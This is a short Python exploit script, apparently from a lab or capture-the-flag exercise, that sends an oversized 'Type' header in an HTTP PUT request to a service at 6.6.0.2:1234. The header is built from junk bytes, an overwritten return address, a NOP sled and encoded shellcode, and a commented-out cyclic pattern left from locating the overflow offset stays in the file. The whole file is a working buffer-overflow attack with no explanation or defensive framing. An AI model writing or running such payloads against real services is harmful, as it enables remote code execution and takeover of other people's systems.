import socket

junk = "AAAAAAAAAAAAAAAAAAAAAAA"
ret = "\x20\x70\xd6\xf7"
buf =  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf += "\xdb\xd9\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x12\xbe\xaf"
buf += "\x0f\x9f\xce\x83\xc0\x04\x31\x70\x13\x03\xdf\x1c\x7d"
buf += "\x3b\x2e\xf8\x76\x27\x03\xbd\x2b\xc2\xa1\xc8\x2d\xa2"
buf += "\xc3\x07\x2d\x50\x52\x28\x11\x9a\xe4\x01\x17\xdd\x8c"
buf += "\x97\xe1\x1d\x4e\xf0\xef\x1d\x5f\x5c\x79\xfc\xef\x3a"
buf += "\x29\xae\x5c\x70\xca\xd9\x83\xbb\x4d\x8b\x2b\x2a\x61"
buf += "\x5f\xc3\xda\x52\xb0\x71\x72\x24\x2d\x27\xd7\xbf\x53"
buf += "\x77\xdc\x72\x13"

padding = "C"*(1024-len(junk)-len(buf)-len(ret))

ip = '6.6.0.2'
port = 1234

payload = "text/html"+junk+ret+buf+padding
#payload = "text/textAa0Aa1Aa2Aa3Aa4Aa5Aa6AaDDDDAa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"
overall = "PUT /asd HTTP/1.0\r\nType: "+payload+"\r\n\r\nDATA"

s = socket.socket()
s.connect((ip, port))
s.send(overall)
s.close()